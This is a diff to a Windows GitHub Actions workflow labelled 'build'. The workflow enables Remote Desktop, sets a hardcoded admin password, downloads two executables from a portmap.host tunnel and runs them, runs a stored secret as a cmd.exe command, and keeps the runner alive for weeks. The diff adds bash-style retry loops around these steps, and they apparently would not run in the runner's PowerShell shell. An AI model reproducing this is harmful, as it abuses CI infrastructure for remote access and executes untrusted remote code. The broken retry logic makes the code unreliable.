@@ -8,7 +8,6 @@ jobs:
   build:
     runs-on: windows-latest
     timeout-minutes: 360 # Set a timeout for the entire job
-    retries: 3 # Retry up to 3 times if the job fails
     steps:
       - name: Enable TS
         run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
@@ -23,30 +22,71 @@ jobs:
         run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
 
       - name: Download second Batch File
-        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe
+        run: |
+          retry_count=0
+          max_retries=3
+          success=false
+          while [ $retry_count -lt $max_retries ]; do
+            Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe && success=true && break
+            retry_count=$((retry_count + 1))
+            echo "Retrying... attempt $retry_count"
+            sleep 10
+          done
+          if [ "$success" != true ]; then exit 1; fi
 
       - name: Execute second Batch File
         run: |
-          Start-Process -FilePath "run.exe"
-          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
-            Start-Sleep -Seconds 5
-          }
+          retry_count=0
+          max_retries=3
+          success=false
+          while [ $retry_count -lt $max_retries ]; do
+            Start-Process -FilePath "run.exe" && success=true && break
+            retry_count=$((retry_count + 1))
+            echo "Retrying... attempt $retry_count"
+            sleep 10
+          done
+          if [ "$success" != true ]; then exit 1; fi
 
       - name: Download third Batch File
-        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run5.exe" -OutFile run5.exe
+        run: |
+          retry_count=0
+          max_retries=3
+          success=false
+          while [ $retry_count -lt $max_retries ]; do
+            Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run5.exe" -OutFile run5.exe && success=true && break
+            retry_count=$((retry_count + 1))
+            echo "Retrying... attempt $retry_count"
+            sleep 10
+          done
+          if [ "$success" != true ]; then exit 1; fi
 
       - name: Execute third Batch File
         run: |
-          Start-Process -FilePath "run5.exe"
-          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
-            Start-Sleep -Seconds 5
-          }
+          retry_count=0
+          max_retries=3
+          success=false
+          while [ $retry_count -lt $max_retries ]; do
+            Start-Process -FilePath "run5.exe" && success=true && break
+            retry_count=$((retry_count + 1))
+            echo "Retrying... attempt $retry_count"
+            sleep 10
+          done
+          if [ "$success" != true ]; then exit 1; fi
 
       - name: Open CMD and Run Secret Command
         env:
           MY_SECRET: ${{ secrets.MY_SECRET }}
         run: |
-          Start-Process -FilePath "cmd.exe" -ArgumentList "/k $env:MY_SECRET"
+          retry_count=0
+          max_retries=3
+          success=false
+          while [ $retry_count -lt $max_retries ]; do
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/k $env:MY_SECRET" && success=true && break
+            retry_count=$((retry_count + 1))
+            echo "Retrying... attempt $retry_count"
+            sleep 10
+          done
+          if [ "$success" != true ]; then exit 1; fi
 
       - name: Keep connection alive for unlimited hours
         run: Start-Sleep -Seconds 2147483
